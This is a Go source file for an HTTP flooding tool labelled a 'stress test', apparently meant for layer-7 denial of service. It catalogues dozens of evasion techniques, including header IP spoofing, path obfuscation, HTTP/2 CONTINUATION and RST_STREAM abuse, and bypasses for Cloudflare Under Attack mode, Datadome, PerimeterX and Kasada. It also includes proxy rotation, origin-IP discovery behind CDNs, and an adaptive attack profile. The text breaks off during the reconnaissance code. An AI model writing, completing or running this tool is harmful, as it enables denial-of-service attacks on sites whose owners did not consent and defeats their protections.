// Usage:
//
//	go run l7.go <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST] [PROXY_LIST_FILE]
//
// Fully automatic: recon -> adapt -> attack. No extra flags needed.
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log/slog"
	"math"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ─── WAF / Recon Types ─────────────────────────────────────────────────────────

type WAFType int

const (
	WAFUnknown            WAFType = iota
	WAFCloudflare                 // cloudflare.com
	WAFCloudflareVShield          // Cloudflare with Under Attack mode / VShield JS challenge
	WAFAWSWAF                     // AWS WAF (ALB / API Gateway)
	WAFAWSCloudFront              // AWS CloudFront with WAF
	WAFCloudfront                 // AWS CloudFront (no WAF)
	WAFAkamai                     // Akamai
	WAFImperva                    // Imperva Incapsula
	WAFF5BIGIP                    // F5 BIG-IP ASM
	WAFModSecurity                // ModSecurity (OWASP CRS)
	WAFSucuri                     // Sucuri CloudProxy
	WAFStackPath                  // StackPath (MaxCDN)
	WAFVarnish                    // Varnish-based WAF
	WAFDatadome                   // Datadome (bot protection)
	WAFPerimeterX                 // PerimeterX (bot protection)
	WAFShape                      // Shape Security (now Akamai)
	WAFKasada                     // Kasada (bot protection)
	WAFArkoseLabs                 // ArkoseLabs (bot protection)
	WAFCloudfrontBehavior         // CloudFront with Lambda@Edge blocking
	WAFGenericBotManager          // Unknown bot manager detected
)

func (w WAFType) String() string {
	switch w {
	case WAFCloudflare:
		return "Cloudflare"
	case WAFCloudflareVShield:
		return "Cloudflare+VShield"
	case WAFAWSWAF:
		return "AWS WAF"
	case WAFAWSCloudFront:
		return "AWS CloudFront+WAF"
	case WAFCloudfront:
		return "AWS CloudFront"
	case WAFAkamai:
		return "Akamai"
	case WAFImperva:
		return "Imperva"
	case WAFF5BIGIP:
		return "F5 BIG-IP"
	case WAFModSecurity:
		return "ModSecurity"
	case WAFSucuri:
		return "Sucuri"
	case WAFStackPath:
		return "StackPath"
	case WAFVarnish:
		return "Varnish"
	case WAFDatadome:
		return "Datadome"
	case WAFPerimeterX:
		return "PerimeterX"
	case WAFShape:
		return "Shape"
	case WAFKasada:
		return "Kasada"
	case WAFArkoseLabs:
		return "ArkoseLabs"
	case WAFCloudfrontBehavior:
		return "CloudFront+Behavior"
	case WAFGenericBotManager:
		return "GenericBotManager"
	default:
		return "Unknown"
	}
}

type ReconResult struct {
	WAFType               WAFType
	WAFConfirmed          bool
	HasCaptcha            bool
	CaptchaType           string // "recaptcha", "hcaptcha", "cloudflare", "turnstile", "arkose", "datadome"
	HasJSChallenge        bool
	HasRateLimit          bool
	RateLimitThreshold    int
	RateLimitWindow       time.Duration
	OriginIPs             []string // discovered origin IPs
	OriginPort            int
	BlockedHeaders        []string // headers that trigger block when set
	AllowedMethods        []string // discovered allowed HTTP methods
	ServerHeader          string
	ResponseHeaders       map[string]string
	HasHSTS               bool
	HasCookieChallenge    bool
	ChallengeCookies      []string          // cookies set after challenge
	ChallengeTokens       map[string]string // challenge token -> cookie value
	SupportsHTTP2         bool
	SupportsHTTP3         bool
	SupportsWebSocket     bool
	HasTrueClientIP       bool
	ResponseTimeBase      time.Duration
	ResponseTimeMax       time.Duration
	TLSVersion            string
	TLSCipherSuites       []string
	BlockedPaths          []string
	AllowedPaths          []string
	HasWAFSpecificHeaders bool
	HasBotManager         bool
	BotManagerType        string                  // "datadome", "perimeterx", "shape", "kasada", "arkose"
	DetectedCookies       map[string]string       // cookies set by the server
	ProbedIPs             []string                // IPs that were probed for recon
	ProbeResults          map[string]*ProbeResult // per-IP probe results
}

type ProbeResult struct {
	WAFType      WAFType
	ResponseTime time.Duration
	StatusCodes  []int
	Headers      map[string]string
	ServerHeader string
	Body         string
	Error        string
}

// BypassTechnique identifies a specific evasion technique.
type BypassTechnique int

const (
	BypassNone BypassTechnique = iota
	BypassHeaderCaseRandomize
	BypassHeaderOrderShuffle
	BypassXForwardedForMulti
	BypassXForwardedForRandom
	BypassTrueClientIP
	BypassCFConnectingIP
	BypassXRealIP
	BypassClientIP
	BypassPathObfuscateDot
	BypassPathObfuscateDoubleSlash
	BypassPathObfuscateBackslash
	BypassPathObfuscateSemicolon
	BypassPathObfuscateNullByte
	BypassPathDoubleEncoding
	BypassPathUnicodeNormalize
	BypassMethodFuzz
	BypassMethodOverride
	BypassContentTypeSwitch
	BypassContentTypeMultipart
	BypassContentTypeCharset
	BypassTransferEncodingChunked
	BypassTransferEncodingObfuscate
	BypassRangeRequest
	BypassCookieRandomize
	BypassCacheBuster
	BypassRefererRandom
	BypassBodyPadding
	BypassParameterPollution
	BypassHTTP09
	BypassHTTP10
	BypassHostHeaderObfuscate
	BypassLineFolding
	BypassTabSeparation
	BypassUnicodeBidi
	BypassDuplicateHeaders
	BypassOriginIPDirect
	BypassCFUnderAttackBypass
	BypassTLSJitter
	BypassRequestDelayJitter
	BypassHTTP2PriorKnowledge
	BypassWebSocketUpgrade
	BypassTLSFingerprintRandomize
	BypassChallengeCookieReplay
	BypassDatadomeBypass
	BypassPerimeterXBypass
	BypassKasadaBypass
	BypassProxyRotate
	BypassResponseDelay
	BypassChunkedPadding
	BypassMultipartMixed
	BypassHTTP2SettingsFrame
	BypassHTTP2RSTStream
	BypassConnectionKeepAlive
	BypassRequestPipelining
	BypassViaHeader
	BypassFromHeader
	BypassForwardedHeader
	BypassAWSVPCHeader
	BypassXForwardedProto
	BypassXForwardedHost
	BypassAcceptEncodingGzipOnly
	BypassNoAcceptHeader
	BypassZeroContentLength
	BypassTLSHelloRetry
	BypassHTTP2Continuation
	BypassHTTP2Priority
	BypassMalformedContentType
	BypassBidiOverride
	BypassHTTP2Ping
	BypassHTTP2Goaway
	BypassHTTP2WindowUpdate
	BypassEarlyData
	BypassWebSocketContinuous
)

// BypassTechniqueInfo holds metadata about a technique.
type BypassTechniqueInfo struct {
	Name        string
	Description string
	Risk        int // 0=low, 1=medium, 2=high (risk of blocking)
}

func (b BypassTechnique) Info() BypassTechniqueInfo {
	switch b {
	case BypassHeaderCaseRandomize:
		return BypassTechniqueInfo{"HeaderCaseRandomize", "Randomize header key casing", 0}
	case BypassHeaderOrderShuffle:
		return BypassTechniqueInfo{"HeaderOrderShuffle", "Shuffle header order", 0}
	case BypassXForwardedForMulti:
		return BypassTechniqueInfo{"XForwardedForMulti", "Multiple X-Forwarded-For IPs", 1}
	case BypassXForwardedForRandom:
		return BypassTechniqueInfo{"XForwardedForRandom", "Random X-Forwarded-For IP", 0}
	case BypassTrueClientIP:
		return BypassTechniqueInfo{"TrueClientIP", "True-Client-IP header", 1}
	case BypassCFConnectingIP:
		return BypassTechniqueInfo{"CFConnectingIP", "CF-Connecting-IP header", 1}
	case BypassXRealIP:
		return BypassTechniqueInfo{"XRealIP", "X-Real-IP header", 1}
	case BypassClientIP:
		return BypassTechniqueInfo{"ClientIP", "Client-IP header", 1}
	case BypassPathObfuscateDot:
		return BypassTechniqueInfo{"PathObfuscateDot", "Path obfuscation with ./", 0}
	case BypassPathObfuscateDoubleSlash:
		return BypassTechniqueInfo{"PathObfuscateDoubleSlash", "Path obfuscation with //", 0}
	case BypassPathObfuscateBackslash:
		return BypassTechniqueInfo{"PathObfuscateBackslash", "Path obfuscation with \\", 1}
	case BypassPathObfuscateSemicolon:
		return BypassTechniqueInfo{"PathObfuscateSemicolon", "Path obfuscation with ;", 1}
	case BypassPathObfuscateNullByte:
		return BypassTechniqueInfo{"PathObfuscateNullByte", "Path obfuscation with %00", 2}
	case BypassPathDoubleEncoding:
		return BypassTechniqueInfo{"PathDoubleEncoding", "Double URL encoding", 1}
	case BypassPathUnicodeNormalize:
		return BypassTechniqueInfo{"PathUnicodeNormalize", "Unicode path normalization", 2}
	case BypassMethodFuzz:
		return BypassTechniqueInfo{"MethodFuzz", "Fuzz HTTP methods", 1}
	case BypassMethodOverride:
		return BypassTechniqueInfo{"MethodOverride", "HTTP method override headers", 0}
	case BypassContentTypeSwitch:
		return BypassTechniqueInfo{"ContentTypeSwitch", "Switch content type", 0}
	case BypassContentTypeMultipart:
		return BypassTechniqueInfo{"ContentTypeMultipart", "Multipart content type", 0}
	case BypassContentTypeCharset:
		return BypassTechniqueInfo{"ContentTypeCharset", "Charset variation", 0}
	case BypassTransferEncodingChunked:
		return BypassTechniqueInfo{"TransferEncodingChunked", "Chunked transfer encoding", 0}
	case BypassTransferEncodingObfuscate:
		return BypassTechniqueInfo{"TransferEncodingObfuscate", "Obfuscated transfer encoding", 1}
	case BypassRangeRequest:
		return BypassTechniqueInfo{"RangeRequest", "Range request header", 0}
	case BypassCookieRandomize:
		return BypassTechniqueInfo{"CookieRandomize", "Random cookie values", 0}
	case BypassCacheBuster:
		return BypassTechniqueInfo{"CacheBuster", "Cache busting parameter", 0}
	case BypassRefererRandom:
		return BypassTechniqueInfo{"RefererRandom", "Random referer", 0}
	case BypassBodyPadding:
		return BypassTechniqueInfo{"BodyPadding", "Padding on body", 0}
	case BypassParameterPollution:
		return BypassTechniqueInfo{"ParameterPollution", "HTTP parameter pollution", 1}
	case BypassHTTP09:
		return BypassTechniqueInfo{"HTTP09", "HTTP/0.9 request", 2}
	case BypassHTTP10:
		return BypassTechniqueInfo{"HTTP10", "HTTP/1.0 request", 0}
	case BypassHostHeaderObfuscate:
		return BypassTechniqueInfo{"HostHeaderObfuscate", "Obfuscated Host header", 1}
	case BypassLineFolding:
		return BypassTechniqueInfo{"LineFolding", "HTTP line folding", 1}
	case BypassTabSeparation:
		return BypassTechniqueInfo{"TabSeparation", "Tab separation in headers", 1}
	case BypassUnicodeBidi:
		return BypassTechniqueInfo{"UnicodeBidi", "Unicode BIDI override", 2}
	case BypassDuplicateHeaders:
		return BypassTechniqueInfo{"DuplicateHeaders", "Duplicate headers with different casing", 1}
	case BypassOriginIPDirect:
		return BypassTechniqueInfo{"OriginIPDirect", "Direct origin IP connection", 2}
	case BypassCFUnderAttackBypass:
		return BypassTechniqueInfo{"CFUnderAttackBypass", "Cloudflare Under Attack mode bypass", 2}
	case BypassTLSJitter:
		return BypassTechniqueInfo{"TLSJitter", "TLS handshake jitter", 0}
	case BypassRequestDelayJitter:
		return BypassTechniqueInfo{"RequestDelayJitter", "Random request delay", 0}
	case BypassHTTP2PriorKnowledge:
		return BypassTechniqueInfo{"HTTP2PriorKnowledge", "HTTP/2 prior knowledge", 1}
	case BypassWebSocketUpgrade:
		return BypassTechniqueInfo{"WebSocketUpgrade", "WebSocket upgrade bypass", 2}
	case BypassTLSFingerprintRandomize:
		return BypassTechniqueInfo{"TLSFingerprintRandomize", "Randomize TLS fingerprint", 1}
	case BypassChallengeCookieReplay:
		return BypassTechniqueInfo{"ChallengeCookieReplay", "Replay challenge cookies", 0}
	case BypassDatadomeBypass:
		return BypassTechniqueInfo{"DatadomeBypass", "Datadome specific bypass", 2}
	case BypassPerimeterXBypass:
		return BypassTechniqueInfo{"PerimeterXBypass", "PerimeterX specific bypass", 2}
	case BypassKasadaBypass:
		return BypassTechniqueInfo{"KasadaBypass", "Kasada specific bypass", 2}
	case BypassProxyRotate:
		return BypassTechniqueInfo{"ProxyRotate", "Rotate through proxies", 1}
	case BypassResponseDelay:
		return BypassTechniqueInfo{"ResponseDelay", "Delay before reading response", 0}
	case BypassChunkedPadding:
		return BypassTechniqueInfo{"ChunkedPadding", "Padding in chunked transfer", 0}
	case BypassMultipartMixed:
		return BypassTechniqueInfo{"MultipartMixed", "Mixed multipart content", 0}
	case BypassHTTP2SettingsFrame:
		return BypassTechniqueInfo{"HTTP2SettingsFrame", "Custom HTTP/2 SETTINGS frame", 1}
	case BypassHTTP2RSTStream:
		return BypassTechniqueInfo{"HTTP2RSTStream", "HTTP/2 RST_STREAM abuse", 2}
	case BypassConnectionKeepAlive:
		return BypassTechniqueInfo{"ConnectionKeepAlive", "Keep-alive connection", 0}
	case BypassRequestPipelining:
		return BypassTechniqueInfo{"RequestPipelining", "HTTP/1.1 request pipelining", 1}
	case BypassViaHeader:
		return BypassTechniqueInfo{"ViaHeader", "Via header spoofing", 0}
	case BypassFromHeader:
		return BypassTechniqueInfo{"FromHeader", "From header spoofing", 0}
	case BypassForwardedHeader:
		return BypassTechniqueInfo{"ForwardedHeader", "Forwarded header", 0}
	case BypassAWSVPCHeader:
		return BypassTechniqueInfo{"AWSVPCHeader", "AWS VPC header spoofing", 1}
	case BypassXForwardedProto:
		return BypassTechniqueInfo{"XForwardedProto", "X-Forwarded-Proto header", 0}
	case BypassXForwardedHost:
		return BypassTechniqueInfo{"XForwardedHost", "X-Forwarded-Host header", 0}
	case BypassAcceptEncodingGzipOnly:
		return BypassTechniqueInfo{"AcceptEncodingGzipOnly", "Only gzip in Accept-Encoding", 0}
	case BypassNoAcceptHeader:
		return BypassTechniqueInfo{"NoAcceptHeader", "No Accept header", 0}
	case BypassZeroContentLength:
		return BypassTechniqueInfo{"ZeroContentLength", "Zero Content-Length", 0}
	case BypassTLSHelloRetry:
		return BypassTechniqueInfo{"TLSHelloRetry", "TLS Hello Retry Request", 2}
	case BypassHTTP2Continuation:
		return BypassTechniqueInfo{"HTTP2Continuation", "HTTP/2 CONTINUATION frame flood", 2}
	case BypassHTTP2Priority:
		return BypassTechniqueInfo{"HTTP2Priority", "HTTP/2 PRIORITY frame", 1}
	case BypassMalformedContentType:
		return BypassTechniqueInfo{"MalformedContentType", "Malformed Content-Type", 1}
	case BypassBidiOverride:
		return BypassTechniqueInfo{"BidiOverride", "Unicode BIDI override in headers", 2}
	case BypassHTTP2Ping:
		return BypassTechniqueInfo{"HTTP2Ping", "HTTP/2 PING frame", 0}
	case BypassHTTP2Goaway:
		return BypassTechniqueInfo{"HTTP2Goaway", "HTTP/2 GOAWAY frame", 1}
	case BypassHTTP2WindowUpdate:
		return BypassTechniqueInfo{"HTTP2WindowUpdate", "HTTP/2 WINDOW_UPDATE frame", 0}
	case BypassEarlyData:
		return BypassTechniqueInfo{"EarlyData", "TLS 1.3 early data (0-RTT)", 1}
	case BypassWebSocketContinuous:
		return BypassTechniqueInfo{"WebSocketContinuous", "Continuous WebSocket frames", 1}
	default:
		return BypassTechniqueInfo{"Unknown", "Unknown technique", 0}
	}
}

// ─── Attack Profile ────────────────────────────────────────────────────────────

type AttackProfile struct {
	Techniques         []BypassTechnique
	Weights            []int                   // parallel to Techniques, for weighted random selection
	TechniqueMap       map[BypassTechnique]int // O(1) lookup: technique -> weight
	TechniqueSuccess   map[BypassTechnique]*TechniqueStats
	TechniqueBlacklist []BypassTechnique // techniques that are blocked
}

type TechniqueStats struct {
	Attempts  int64
	Successes int64
	Blocks    int64
	LastUsed  time.Time
	Score     float64 // dynamic score (0.0 - 1.0)
}

func NewAttackProfile() *AttackProfile {
	return &AttackProfile{
		TechniqueMap:     make(map[BypassTechnique]int),
		TechniqueSuccess: make(map[BypassTechnique]*TechniqueStats),
	}
}

func (ap *AttackProfile) AddTechnique(t BypassTechnique, weight int) {
	ap.Techniques = append(ap.Techniques, t)
	ap.Weights = append(ap.Weights, weight)
	ap.TechniqueMap[t] = weight
	ap.TechniqueSuccess[t] = &TechniqueStats{Score: 1.0}
}

func (ap *AttackProfile) GetWeight(t BypassTechnique) (int, bool) {
	w, ok := ap.TechniqueMap[t]
	return w, ok
}

func (ap *AttackProfile) RebuildMap() {
	ap.TechniqueMap = make(map[BypassTechnique]int, len(ap.Techniques))
	for i, t := range ap.Techniques {
		ap.TechniqueMap[t] = ap.Weights[i]
	}
}

// ─── Config ───────────────────────────────────────────────────────────────────

type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
	ProxyFile  string
}

// ─── HTTP helpers ─────────────────────────────────────────────────────────────

var (
	httpMethods = []string{"GET", "GET", "GET", "POST", "HEAD", "OPTIONS", "PATCH", "PUT", "DELETE", "TRACE", "CONNECT"}

	contentTypes = []string{
		"application/x-www-form-urlencoded",
		"application/json",
		"text/plain",
		"multipart/form-data",
		"application/xml",
		"text/xml",
		"application/octet-stream",
	}

	languages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en-US;q=0.8",
		"de-DE,de;q=0.9,en-US;q=0.8",
		"ja-JP,ja;q=0.9,en-US;q=0.8",
		"ru-RU,ru;q=0.9,en-US;q=0.8",
		"zh-CN,zh;q=0.9,en-US;q=0.8",
		"ar-SA,ar;q=0.9,en-US;q=0.8",
		"pt-BR,pt;q=0.9,en-US;q=0.8",
		"es-ES,es;q=0.9,en-US;q=0.8",
		"ko-KR,ko;q=0.9,en-US;q=0.8",
		"it-IT,it;q=0.9,en-US;q=0.8",
	}

	bufPool     = sync.Pool{New: func() any { return new(bytes.Buffer) }}
	bodyBufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}

	uaPool        []string
	refererPool   []string
	ipPool        []string // pre-generated random IPs
	chromeVerPool []string
	countryPool   []string

	// Pre-allocated buffers for common operations
	httpNewline = []byte("\r\n")
	httpSpace   = []byte(" ")
	httpColon   = []byte(": ")
)

func init() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	uaPool = make([]string, 200)
	for i := range uaPool {
		uaPool[i] = generateUserAgent(rng)
	}
	refererPool = generateReferers()

	// Pre-generate random IPs for speed
	ipPool = make([]string, 1000)
	for i := range ipPool {
		ipPool[i] = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}

	// Pre-generate Chrome versions
	chromeVerPool = make([]string, 50)
	for i := range chromeVerPool {
		chromeVerPool[i] = strconv.Itoa(rng.Intn(30) + 90)
	}

	countryPool = []string{"US", "GB", "DE", "FR", "JP", "BR", "CA", "AU", "IN", "RU", "CN", "KR", "SG", "NL", "SE"}
}

func generateReferers() []string {
	bases := []string{
		"https://www.google.com/search?q=",
		"https://www.bing.com/search?q=",
		"https://duckduckgo.com/?q=",
		"https://t.co/",
		"https://www.facebook.com/",
		"https://l.facebook.com/l.php?u=",
		"https://twitter.com/",
		"https://www.reddit.com/r/",
		"https://news.ycombinator.com/",
		"https://www.linkedin.com/",
		"https://out.reddit.com/",
		"https://www.pinterest.com/pin/",
		"https://www.instagram.com/",
		"https://www.youtube.com/",
		"https://youtu.be/",
		"https://medium.com/",
		"https://stackoverflow.com/questions/",
		"https://github.com/",
		"https://en.wikipedia.org/wiki/",
		"https://amazon.com/dp/",
	}
	pool := make([]string, 0, len(bases)*10)
	prng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for _, b := range bases {
		for i := 0; i < 10; i++ {
			pool = append(pool, b+randomString(prng, 6))
		}
	}
	return pool
}

// ─── Manager ──────────────────────────────────────────────────────────────────

type Manager struct {
	cfg StressConfig

	ipsMu sync.Mutex
	ips   []string

	proxies  []string
	proxyIdx atomic.Int64

	rebalanceCh chan []string

	recon      *ReconResult
	profile    *AttackProfile
	reconOnce  sync.Once
	reconReady chan struct{}

	methodSuccess sync.Map

	totalReqs   atomic.Int64
	totalErrors atomic.Int64
	totalBlocks atomic.Int64
	totalAdapts atomic.Int64

	// RTT tracking for adaptive timeouts
	rttMeasured atomic.Int64 // nanoseconds
	rttCount    atomic.Int64

	// Technique stats
	techniqueStats map[BypassTechnique]*TechniqueStats
	statsMu        sync.Mutex
}

func NewManager(cfg StressConfig) *Manager {
	return &Manager{
		cfg:            cfg,
		rebalanceCh:    make(chan []string, 1),
		reconReady:     make(chan struct{}),
		techniqueStats: make(map[BypassTechnique]*TechniqueStats),
	}
}

func (m *Manager) updateIPs(newIPs []string) {
	m.ipsMu.Lock()
	m.ips = newIPs
	m.ipsMu.Unlock()
}

func (m *Manager) snapshotIPs() []string {
	m.ipsMu.Lock()
	defer m.ipsMu.Unlock()
	out := make([]string, len(m.ips))
	copy(out, m.ips)
	return out
}

func (m *Manager) getRTT() time.Duration {
	n := m.rttCount.Load()
	if n == 0 {
		return 50 * time.Millisecond
	}
	return time.Duration(m.rttMeasured.Load() / n)
}

func (m *Manager) recordRTT(rtt time.Duration) {
	m.rttMeasured.Add(int64(rtt))
	m.rttCount.Add(1)
}

// ─── Entry point ──────────────────────────────────────────────────────────────

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST] [PROXY_LIST_FILE]\n", os.Args[0])
		os.Exit(1)
	}

	threads, err := strconv.Atoi(os.Args[2])
	if err != nil || threads <= 0 {
		fmt.Fprintf(os.Stderr, "Invalid THREADS (%q): must be a positive integer.\n", os.Args[2])
		os.Exit(1)
	}
	durSec, err := strconv.Atoi(os.Args[3])
	if err != nil || durSec <= 0 {
		fmt.Fprintf(os.Stderr, "Invalid DURATION_SEC (%q): must be a positive integer.\n", os.Args[3])
		os.Exit(1)
	}

	rawURL := os.Args[1]
	parsedURL, err := url.Parse(rawURL)
	if err != nil || parsedURL.Scheme == "" || parsedURL.Hostname() == "" {
		fmt.Fprintf(os.Stderr, "Invalid URL: %q\n", rawURL)
		os.Exit(1)
	}
	if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
		fmt.Fprintf(os.Stderr, "URL scheme must be http or https, got %q\n", parsedURL.Scheme)
		os.Exit(1)
	}

	customHost := ""
	if len(os.Args) > 4 {
		customHost = os.Args[4]
	}

	proxyFile := ""
	if len(os.Args) > 5 {
		proxyFile = os.Args[5]
	}

	path := parsedURL.RequestURI()
	if path == "" {
		path = "/"
	}

	cfg := StressConfig{
		Target:     parsedURL,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: customHost,
		Port:       determinePort(parsedURL),
		Path:       path,
		ProxyFile:  proxyFile,
	}

	addrs, err := lookupIPv4(parsedURL.Hostname())
	if err != nil {
		fmt.Fprintf(os.Stderr, "Initial DNS lookup failed: %v\n", err)
		os.Exit(1)
	}
	slog.Info("resolved IPs", "ips", addrs)

	mgr := NewManager(cfg)
	mgr.updateIPs(addrs)

	// Load proxies if specified
	if proxyFile != "" {
		proxies, err := loadProxies(proxyFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Failed to load proxies: %v\n", err)
			os.Exit(1)
		}
		mgr.proxies = proxies
		slog.Info("loaded proxies", "count", len(proxies))
	}

	rootCtx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		select {
		case <-sigCh:
			slog.Info("interrupt received; shutting down early")
			cancel()
		case <-rootCtx.Done():
		}
	}()

	// ── Reconnaissance Phase ──
	fmt.Println("\n=== RECONNAISSANCE ===")
	reconCtx, reconCancel := context.WithTimeout(rootCtx, 15*time.Second)
	mgr.runRecon(reconCtx)
	reconCancel()

	// Pretty-print recon results
	r := mgr.recon
	fmt.Println("── Target ───────────────────────────────────")
	fmt.Printf("  URL:              %s\n", cfg.Target.String())
	fmt.Printf("  Threads:          %d\n", cfg.Threads)
	fmt.Printf("  Duration:         %s\n", cfg.Duration)
	fmt.Println("\n── DNS Resolution ───────────────────────────")
	fmt.Printf("  Hostname:         %s\n", cfg.Target.Hostname())
	fmt.Printf("  Resolved IPs:     %v\n", r.ProbedIPs)
	if len(r.OriginIPs) > 0 {
		fmt.Printf("  Origin IPs:       %v (discovered via CNAME)\n", r.OriginIPs)
	}

	fmt.Println("\n── WAF Detection ────────────────────────────")
	fmt.Printf("  WAF:              %s\n", r.WAFType)
	fmt.Printf("  Confirmed:        %t\n", r.WAFConfirmed)
	if r.HasBotManager {
		fmt.Printf("  Bot Manager:      %s (%s)\n", r.BotManagerType, r.WAFType)
	}
	fmt.Printf("  Server Header:    %s\n", r.ServerHeader)
	if r.HasWAFSpecificHeaders {
		fmt.Println("  WAF Headers:      present")
	}

	fmt.Println("\n── Challenge Detection ──────────────────────")
	fmt.Printf("  JS Challenge:     %t\n", r.HasJSChallenge)
	fmt.Printf("  Captcha:          %t", r.HasCaptcha)
	if r.HasCaptcha {
		fmt.Printf(" (%s)", r.CaptchaType)
	}
	fmt.Println()
	fmt.Printf("  Cookie Challenge: %t\n", r.HasCookieChallenge)
	fmt.Printf("  Rate Limit:       %t", r.HasRateLimit)
	if r.HasRateLimit {
		fmt.Printf(" (threshold: ~%d req/s)", r.RateLimitThreshold)
	}
	fmt.Println()

	fmt.Println("\n── Protocol Support ─────────────────────────")
	fmt.Printf("  HTTP/2:           %t\n", r.SupportsHTTP2)
	fmt.Printf("  WebSocket:        %t\n", r.SupportsWebSocket)
	fmt.Printf("  HSTS:             %t\n", r.HasHSTS)

	fmt.Println("\n── Per-IP Probe Results ─────────────────────")
	for _, ip := range r.ProbedIPs {
		pr, ok := r.ProbeResults[ip]
		if !ok {
			fmt.Printf("  %-15s  no data\n", ip)
			continue
		}
		errStr := ""
		if pr.Error != "" {
			errStr = fmt.Sprintf(" [error: %s]", pr.Error)
		}
		statusStr := ""
		for _, s := range pr.StatusCodes {
			if statusStr != "" {
				statusStr += ", "
			}
			statusStr += strconv.Itoa(s)
		}
		fmt.Printf("  %-15s  status=%s  rtt=%s  server=%s%s\n",
			ip, statusStr, pr.ResponseTime.Round(time.Millisecond), pr.ServerHeader, errStr)
	}

	fmt.Println("\n── Attack Profile ───────────────────────────")
	fmt.Printf("  Techniques:       %d\n", len(mgr.profile.Techniques))
	if len(mgr.profile.Techniques) > 0 {
		fmt.Printf("  Techniques:       ")
		// Show first 10 techniques
		count := 0
		for _, t := range mgr.profile.Techniques {
			if count >= 10 {
				fmt.Printf("... (+%d more)", len(mgr.profile.Techniques)-10)
				break
			}
			if count > 0 {
				fmt.Printf(", ")
			}
			fmt.Printf("%s(%d)", t.Info().Name, mgr.profile.TechniqueMap[t])
			count++
		}
		fmt.Println()
	}
	if len(r.AllowedMethods) > 0 {
		fmt.Printf("  Allowed Methods:  %v\n", r.AllowedMethods)
	}
	if len(r.BlockedPaths) > 0 {
		fmt.Printf("  Blocked Paths:    %v\n", r.BlockedPaths)
	}
	fmt.Println("──────────────────────────────────────────────\n")

	close(mgr.reconReady)

	go mgr.dnsRefresh(rootCtx, parsedURL.Hostname(), 30*time.Second)
	go mgr.runStats(rootCtx, 5*time.Second)

	slog.Info("stress test starting",
		"url", rawURL, "threads", threads,
		"duration", cfg.Duration,
		"profile_techniques", len(mgr.profile.Techniques),
	)
	mgr.runManager(rootCtx)
	slog.Info("stress test completed",
		"requests", mgr.totalReqs.Load(),
		"errors", mgr.totalErrors.Load(),
		"blocks", mgr.totalBlocks.Load(),
		"adapts", mgr.totalAdapts.Load(),
	)
}

func loadProxies(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var proxies []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	return proxies, scanner.Err()
}

// ─── Reconnaissance ───────────────────────────────────────────────────────────

func (m *Manager) runRecon(ctx context.Context) {
	result := &ReconResult{
		ResponseHeaders: make(map[string]string),
		OriginPort:      m.cfg.Port,
		DetectedCookies: make(map[string]string),
		ChallengeTokens: make(map[string]string),
		ProbeResults:    make(map[string]*ProbeResult),
		ProbedIPs:       make([]string, 0),
	}

	hostHdr := m.cfg.Target.Hostname()
	if m.cfg.CustomHost != "" {
		hostHdr = m.cfg.CustomHost
	}

	ips := m.snapshotIPs()

	// Probe all resolved IPs for multi-IP recon
	for _, ip := range ips {
		if ctx.Err() != nil {
			break
		}
		result.ProbedIPs = append(result.ProbedIPs, ip)
		pr := &ProbeResult{}

		respHeaders, respBody, serverHdr, statusCode, rtt, err := m.reconProbe(ctx, "GET", hostHdr, "", ip)
		pr.StatusCodes = append(pr.StatusCodes, statusCode)
		pr.ResponseTime = rtt
		pr.ServerHeader = serverHdr
		pr.Headers = respHeaders

		if err == nil {
			if serverHdr != "" {
				result.ServerHeader = serverHdr
			}
			if rtt < result.ResponseTimeBase || result.ResponseTimeBase == 0 {
				result.ResponseTimeBase = rtt
			}
			if rtt > result.ResponseTimeMax {
				result.ResponseTimeMax = rtt
			}
			for k, v := range respHeaders {
				result.ResponseHeaders[strings.ToLower(k)] = v
			}
			// Detect WAF on first probe, but accumulate signals from all probes
			if ip == ips[0] {
				m.detectWAF(result, respHeaders, respBody, statusCode)
			} else {
				// Accumulate WAF signals from other IPs
				m.accumulateWAFSignals(result, respHeaders, respBody, statusCode)
			}
			// Extract cookies from response
			extractCookies(respHeaders, result)
		} else {
			pr.Error = err.Error()
		}
		result.ProbeResults[ip] = pr
	}

	// If we didn't get a WAF detection from the first probe, try other IPs
	if result.WAFType == WAFUnknown {
		// Re-run WAF detection on the best responded IP
		for _, ip := range ips {
			if pr, ok := result.ProbeResults[ip]; ok && pr.Error == "" {
				m.detectWAF(result, pr.Headers, pr.Body, pr.StatusCodes[0])
				if result.WAFType != WAFUnknown {
					break
				}
			}
		}
	}

	// Methods discovery
	if methods, ok := m.reconMethods(ctx, hostHdr); ok {
		result.AllowedMethods = methods
	}

	// HTTP/2 support check
	result.SupportsHTTP2 = m.reconCheckHTTP2(ctx, hostHdr)

	// WebSocket support check
	result.SupportsWebSocket = m.reconCheckWebSocket(ctx, hostHdr)

	// Origin discovery
	originIPs := m.reconOriginDiscovery(ctx, hostHdr)
	result.OriginIPs = originIPs
	if len(originIPs) > 0 {
		slog.Info("[RECON] discovered origin IP(s)", "ips", originIPs)
	}

	// Blocked paths discovery
	result.BlockedPaths = m.reconBlockedPaths(ctx, hostHdr)

	// Rate limit detection
